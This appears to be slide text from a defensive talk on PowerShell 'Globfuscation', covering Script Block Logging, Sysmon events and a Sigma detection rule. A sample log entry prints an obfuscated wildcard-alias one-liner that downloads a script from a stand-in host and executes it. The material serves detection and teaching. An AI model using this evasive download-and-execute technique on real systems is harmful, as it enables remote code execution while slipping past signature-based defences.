Get-Alias '?e[?x]' — Zero Literal Cmdlet Names

No Invoke-Expression. No iex. No Invoke-RestMethod. Nowhere in the script. Coined “Globfuscation” by researcher John Hammond.
STEEP#MAVERICK

You Can't Signature a String That Was Never Written

What a signature sees

.(gal ?e[?x])((gal ?rm) '...')
✕ no match

What actually runs

Invoke-Expression $payload
✓ executes
  • String-match detections: nothing to match — iex only exists at runtime
  • Get-Alias / Get-Command: everywhere, benign, unflagged

Three Sources, Three Jobs

SourceCapturesUnique value
4104deobfuscated script text at parse timereads the attacker's own deobfuscation for you
4103 + 4100sbound cmdlet + parameterssurvives when source text is hard to grep
Sysmon 1/7/17process launch, image load, named pipeengine-agnostic — survives PS logging being disabled
No single source is enough. Script Block Logging is richest but PowerShell-engine-specific and attacker-disableable. Sysmon is engine-agnostic ground truth but doesn't see inside the interpreter. Module logging is the cross-check that catches the gap between the two.

Raw 4104 — Wildcard Get-Alias → IEX

01-wildcard-getalias-iex.log
Log Name:      Microsoft-Windows-PowerShell/Operational
EventID:       4104
Computer:      WKSTN17.contoso-corp.test
ScriptBlockId: 2c9cb3d7-2609-4b6f-ae94-6bb780d86f62
ScriptBlockText:
.(gal ?e[?x])((gal ?rm) 'hxxp[://]cdn-sync-relay[.]test/lib/mod2.ps1')
gal = Get-Alias, wildcard-resolves to iex. Inner (gal ?rm) resolves to irm (Invoke-RestMethod). Net effect: download and execute — neither cmdlet name ever typed.
LIVE DEMO

Building the Rule

sigma-t1027010-wildcard-alias-iex.yml
selection_alias_lookup:
  ScriptBlockText|contains:
    - "gal "   - "gcm "   - "(gal "  - "(gcm "

selection_exec_alias_target:
  ScriptBlockText|contains:
    - "\?e[\?x]" - "\?e\*x"   - "\?rm"

condition: selection_alias_lookup AND selection_exec_alias_target
The backslashes are load-bearing: in Sigma, ? and * are wildcard operators, not literal characters — the same trap as the PowerShell trick itself. Escape them or the rule matches almost anything.
